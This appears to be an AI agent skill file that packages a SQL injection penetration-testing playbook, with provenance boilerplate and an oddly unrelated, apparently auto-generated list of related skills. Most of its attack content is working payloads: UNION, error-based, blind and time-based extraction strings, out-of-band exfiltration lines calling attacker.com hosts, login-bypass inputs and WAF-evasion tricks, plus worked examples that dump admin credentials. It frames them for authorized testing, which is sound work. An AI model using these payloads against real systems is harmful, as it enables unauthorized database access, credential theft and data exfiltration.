---
name: sql-injection-testing
description: "SQL Injection Testing workflow skill. Use this skill when the user needs Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms and the operator should preserve the upstream workflow, copied support files, and provenance before merging or handing off."
version: "0.0.1"
category: testing-security
tags: ["sql-injection-testing", "execute", "comprehensive", "sql", "injection", "vulnerability", "assessments", "web"]
complexity: advanced
risk: caution
tools: ["codex-cli", "claude-code", "cursor", "gemini-cli", "opencode"]
source: community
author: "zebbern"
date_added: "2026-04-15"
date_updated: "2026-04-18"
---

# SQL Injection Testing

## Overview

This public intake copy packages `plugins/antigravity-awesome-skills-claude/skills/sql-injection-testing` from `https://github.com/sickn33/antigravity-awesome-skills` into the native Omni Skills editorial shape without hiding its origin.

Use it when the operator needs the upstream workflow, support files, and repository context to stay intact while the public validator and private enhancer continue their normal downstream flow.

This intake keeps the copied upstream files intact and uses `EXTERNAL_SOURCE.json` plus `ORIGIN.md` as the provenance anchor for review.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments. # SQL Injection Testing

Imported source sections that did not map cleanly to the public headings are still preserved below or in the support files. Notable imported sections: Purpose, Inputs / Prerequisites, Outputs / Deliverables.

## When to Use This Skill

Use this section as the trigger filter. It should make the activation boundary explicit before the operator loads files, runs commands, or opens a pull request.

- This skill is applicable to execute the workflow or actions described in the overview.
- Use when the request clearly matches the imported source intent: Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms.
- Use when the operator should preserve upstream workflow detail instead of rewriting the process from scratch.
- Use when provenance needs to stay visible in the answer, PR, or review packet.
- Use when copied upstream references, examples, or scripts materially improve the answer.
- Use when the workflow should remain reviewable in the public intake repo before the private enhancer takes over.

## Operating Table

| Situation | Start here | Why it matters |
| --- | --- | --- |
| First-time use | `EXTERNAL_SOURCE.json` | Confirms repository, branch, commit, and imported path before touching the copied workflow |
| Provenance review | `ORIGIN.md` | Gives reviewers a plain-language audit trail for the imported source |
| Workflow execution | `SKILL.md` | Starts with the smallest copied file that materially changes execution |
| Supporting context | `SKILL.md` | Adds the next most relevant copied source file without loading the entire package |
| Handoff decision | `## Related Skills` | Helps the operator switch to a stronger native skill when the task drifts |

## Workflow

This workflow is intentionally editorial and operational at the same time. It keeps the imported source useful to the operator while still satisfying the public intake standards that feed the downstream enhancer flow.

1. URL parameters: ?id=1, ?user=admin, ?category=books
2. Form fields: username, password, search, comments
3. Cookie values: sessionid, userpreference
4. HTTP headers: User-Agent, Referer, X-Forwarded-For
5. Database error messages revealing query structure
6. Unexpected application behavior changes
7. HTTP 500 Internal Server errors

### Imported Workflow Notes

#### Imported: Core Workflow

### Phase 1: Detection and Reconnaissance

#### Identify Injectable Parameters
Locate user-controlled input fields that interact with database queries:

```
# Common injection points
- URL parameters: ?id=1, ?user=admin, ?category=books
- Form fields: username, password, search, comments
- Cookie values: session_id, user_preference
- HTTP headers: User-Agent, Referer, X-Forwarded-For
```

#### Test for Basic Vulnerability Indicators
Insert special characters to trigger error responses:

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon for query stacking
;

-- Parentheses
)
```

Monitor application responses for:
- Database error messages revealing query structure
- Unexpected application behavior changes
- HTTP 500 Internal Server errors
- Modified response content or length

#### Logic Testing Payloads
Verify boolean-based vulnerability presence:

```sql
-- True condition tests
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- False condition tests  
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

Compare responses between true and false conditions to confirm injection capability.

### Phase 2: Exploitation Techniques

#### UNION-Based Extraction
Combine attacker-controlled SELECT statements with original query:

```sql
-- Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error occurs

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Error-Based Extraction
Force database errors that leak information:

```sql
-- MSSQL version extraction
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL extraction via XPATH
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL cast errors
1' AND 1=CAST((SELECT version()) AS int)--
```

#### Blind Boolean-Based Extraction
Infer data through application behavior changes:

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional responses
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### Time-Based Blind Extraction
Use database sleep functions for confirmation:

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### Out-of-Band (OOB) Extraction
Exfiltrate data through external channels:

```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS exfiltration
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP request
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### Phase 3: Authentication Bypass

#### Login Form Exploitation
Craft payloads to bypass credential verification:

```sql
-- Classic bypass
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Username enumeration
admin' AND '1'='1
admin' AND '1'='2
```

Query transformation example:
```sql
-- Original query
SELECT * FROM users WHERE username='input' AND password='input'

-- Injected (username: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed via comment
```

### Phase 4: Filter Bypass Techniques

#### Character Encoding Bypass
When special characters are blocked:

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Unicode alternatives
U+0027 (apostrophe)
U+02B9 (modifier letter prime)

-- Hexadecimal strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
```

#### Whitespace Bypass
Substitute blocked spaces:

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  -- Tab character
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

#### Keyword Bypass
Evade blacklisted SQL keywords:

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION

-- Null byte injection
%00SELECT
SEL%00ECT
```

#### Imported: Purpose

Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.

## Examples

### Example 1: Ask for the upstream workflow directly

```text
Use @sql-injection-testing to handle <task>. Start from the copied upstream workflow, load only the files that change the outcome, and keep provenance visible in the answer.
```

**Explanation:** This is the safest starting point when the operator needs the imported workflow, but not the entire repository.

### Example 2: Ask for a provenance-grounded review

```text
Review @sql-injection-testing against EXTERNAL_SOURCE.json and ORIGIN.md, then explain which copied upstream files you would load first and why.
```

**Explanation:** Use this before review or troubleshooting when you need a precise, auditable explanation of origin and file selection.

### Example 3: Narrow the copied support files before execution

```text
Use @sql-injection-testing for <task>. Load only the copied references, examples, or scripts that change the outcome, and name the files explicitly before proceeding.
```

**Explanation:** This keeps the skill aligned with progressive disclosure instead of loading the whole copied package by default.

### Example 4: Build a reviewer packet

```text
Review @sql-injection-testing using the copied upstream files plus provenance, then summarize any gaps before merge.
```

**Explanation:** This is useful when the PR is waiting for human review and you want a repeatable audit packet.

### Imported Usage Notes

#### Imported: Examples

### Example 1: E-commerce Product Page SQLi

**Scenario**: Testing product display page with ID parameter

**Initial Request**:
```
GET /product.php?id=5 HTTP/1.1
```

**Detection Test**:
```
GET /product.php?id=5' HTTP/1.1
Response: MySQL error - syntax error near ''' 
```

**Column Enumeration**:
```
GET /product.php?id=5 ORDER BY 4-- HTTP/1.1
Response: Normal
GET /product.php?id=5 ORDER BY 5-- HTTP/1.1
Response: Error (4 columns confirmed)
```

**Data Extraction**:
```
GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
Response: Displays admin credentials
```

### Example 2: Blind Time-Based Extraction

**Scenario**: No visible output, testing for blind injection

**Confirm Vulnerability**:
```sql
id=5' AND SLEEP(5)-- 
-- Response delayed by 5 seconds (vulnerable confirmed)
```

**Extract Database Name Length**:
```sql
id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
-- Delay confirms database name is 8 characters
```

**Extract Characters**:
```sql
id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
-- Iterate through characters to extract: 'appstore'
```

### Example 3: Login Bypass

**Target**: Admin login form

**Standard Login Query**:
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

**Injection Payload**:
```
Username: administrator'--
Password: anything
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```

**Result**: Password check bypassed, authenticated as administrator.

## Best Practices

Treat the generated public skill as a reviewable packaging layer around the upstream repository. The goal is to keep provenance explicit and load only the copied source material that materially improves execution.

- Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
- Limit data extraction to proof-of-concept quantities
- Avoid denial-of-service through resource-intensive queries
- Stop immediately upon detecting production database with real user data
- WAF/IPS may block common payloads requiring evasion techniques
- Parameterized queries prevent standard injection
- Some blind injection requires extensive requests (rate limiting concerns)

### Imported Operating Notes

#### Imported: Constraints and Guardrails

### Operational Boundaries
- Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
- Limit data extraction to proof-of-concept quantities
- Avoid denial-of-service through resource-intensive queries
- Stop immediately upon detecting production database with real user data

### Technical Limitations
- WAF/IPS may block common payloads requiring evasion techniques
- Parameterized queries prevent standard injection
- Some blind injection requires extensive requests (rate limiting concerns)
- Second-order injection requires understanding of data flow

### Legal and Ethical Requirements
- Written scope agreement must exist before testing
- Document all extracted data and handle per data protection requirements
- Report critical vulnerabilities immediately through agreed channels
- Never access data beyond scope requirements

## Troubleshooting

### Problem: The operator skipped the imported context and answered too generically

**Symptoms:** The result ignores the upstream workflow in `plugins/antigravity-awesome-skills-claude/skills/sql-injection-testing`, fails to mention provenance, or does not use any copied source files at all.
**Solution:** Re-open `EXTERNAL_SOURCE.json`, `ORIGIN.md`, and the most relevant copied upstream files. Load only the files that materially change the answer, then restate the provenance before continuing.

### Problem: The imported workflow feels incomplete during review

**Symptoms:** Reviewers can see the generated `SKILL.md`, but they cannot quickly tell which references, examples, or scripts matter for the current task.
**Solution:** Point at the exact copied references, examples, scripts, or assets that justify the path you took. If the gap is still real, record it in the PR instead of hiding it.

### Problem: The task drifted into a different specialization

**Symptoms:** The imported skill starts in the right place, but the work turns into debugging, architecture, design, security, or release orchestration that a native skill handles better.
**Solution:** Use the related skills section to hand off deliberately. Keep the imported provenance visible so the next skill inherits the right context instead of starting blind.

### Imported Troubleshooting Notes

#### Imported: Troubleshooting

### No Error Messages Displayed
- Application uses generic error handling
- Switch to blind injection techniques (boolean or time-based)
- Monitor response length differences instead of content

### UNION Injection Fails
- Column count may be incorrect → Test with ORDER BY
- Data types may mismatch → Use NULL for all columns first
- Results may not display → Find injectable column positions

### WAF Blocking Requests
- Use encoding techniques (URL, hex, unicode)
- Insert inline comments within keywords
- Try alternative syntax for same operations
- Fragment payload across multiple parameters

### Payload Not Executing
- Verify correct comment syntax for database type
- Check if application uses parameterized queries
- Confirm input reaches SQL query (not filtered client-side)
- Test different injection points (headers, cookies)

### Time-Based Injection Inconsistent
- Network latency may cause false positives
- Use longer delays (10+ seconds) for clarity
- Run multiple tests to confirm pattern
- Consider server-side caching effects

## Related Skills

- `@server-management` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@service-mesh-expert` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@service-mesh-observability` - Use when the work is better handled by that native specialization after this imported skill establishes context.
- `@sexual-health-analyzer` - Use when the work is better handled by that native specialization after this imported skill establishes context.

## Additional Resources

Use this support matrix and the linked files below as the operator packet for this imported skill. They should reflect real copied source material, not generic scaffolding.

| Resource family | What it gives the reviewer | Example path |
| --- | --- | --- |
| `references` | copied reference notes, guides, or background material from upstream | `references/n/a` |
| `examples` | worked examples or reusable prompts copied from upstream | `examples/n/a` |
| `scripts` | upstream helper scripts that change execution or validation | `scripts/n/a` |
| `agents` | routing or delegation notes that are genuinely part of the imported package | `agents/n/a` |
| `assets` | supporting assets or schemas copied from the source package | `assets/n/a` |



### Imported Reference Notes

#### Imported: Quick Reference

### Detection Test Sequence
```
1. Insert ' → Check for error
2. Insert " → Check for error
3. Try: OR 1=1-- → Check for behavior change
4. Try: AND 1=2-- → Check for behavior change
5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
```

### Database Fingerprinting
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT @@servername

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
SELECT * FROM v$version
```

### Information Schema Queries
```sql
-- MySQL/MSSQL table enumeration
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Column enumeration
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle equivalent
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Common Payloads Quick List
| Purpose | Payload |
|---------|---------|
| Basic test | `'` or `"` |
| Boolean true | `OR 1=1--` |
| Boolean false | `AND 1=2--` |
| Comment (MySQL) | `#` or `-- ` |
| Comment (MSSQL) | `--` |
| UNION probe | `UNION SELECT NULL--` |
| Time delay | `AND SLEEP(5)--` |
| Auth bypass | `' OR '1'='1` |

#### Imported: Inputs / Prerequisites

### Required Access
- Target web application URL with injectable parameters
- Burp Suite or equivalent proxy tool for request manipulation
- SQLMap installation for automated exploitation
- Browser with developer tools enabled

### Technical Requirements
- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
- Knowledge of HTTP request/response cycle
- Familiarity with database schemas and structures
- Write permissions for testing reports

### Legal Prerequisites
- Written authorization for penetration testing
- Defined scope including target URLs and parameters
- Emergency contact procedures established
- Data handling agreements in place

#### Imported: Outputs / Deliverables

### Primary Outputs
- SQL injection vulnerability report with severity ratings
- Extracted database schemas and table structures
- Authentication bypass proof-of-concept demonstrations
- Remediation recommendations with code examples

### Evidence Artifacts
- Screenshots of successful injections
- HTTP request/response logs
- Database dumps (sanitized)
- Payload documentation
